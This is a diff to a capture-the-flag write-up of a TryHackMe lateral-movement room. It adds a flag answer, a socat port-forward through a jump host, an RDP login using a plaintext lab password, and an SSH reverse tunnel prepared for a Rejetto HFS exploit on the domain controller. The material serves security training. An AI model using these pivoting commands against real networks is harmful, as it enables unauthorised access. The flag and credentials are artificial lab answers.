@@ -1199,7 +1199,7 @@ After launching the exploit, you will receive a shell back at the attacker's mac
 
 * What is the flag obtained from executing "flag.exe" on t1_thomas.moore's desktop on THMIIS?
 
-    ``
+    `THM{SIGHT_BEYOND_SIGHT}`
 
     * Get Credential
     
@@ -1211,9 +1211,39 @@ After launching the exploit, you will receive a shell back at the attacker's mac
         ssh za\\barbara.taylor@thmjmp2.za.tryhackme.com
         ```
 
-        
+    * Port forwarding with socat
+    
+        ```
+        socat.exe TCP4-LISTEN:19988,fork TCP4:THMIIS.za.tryhackme.com:3389
+        ```
+
+        ![task7-socat](./images/task7-socat.png)
+
+    * Connect to THMIIS via RDP from your attacker machine
+    
+        ```
+        xfreerdp /v:THMJMP2.za.tryhackme.com:19988 /u:t1_thomas.moore /p:MyPazzw3rd2020
+        ```
+
+        ![task7-rdp](./images/task7-rdp.png)
+
+    * Get the flag
+    
+        ![task7-flag](./images/task7-flag.png)
 
 * What is the flag obtained using the Rejetto HFS exploit on THMDC?
+
+    ``
+
+    * Setup tunnelling
+    
+        ```
+        ssh tunneluser@10.50.46.109 -R 9999:thmdc.za.tryhackme.com:80 -L *:2222:127.0.0.1:2222 -L *:3333:127.0.0.1:3333 -N
+        ```
+
+        ![task7-tunnel](./images/task7-tunnel.png)
+
+
 
 ## Task 8 - Conclusion
 
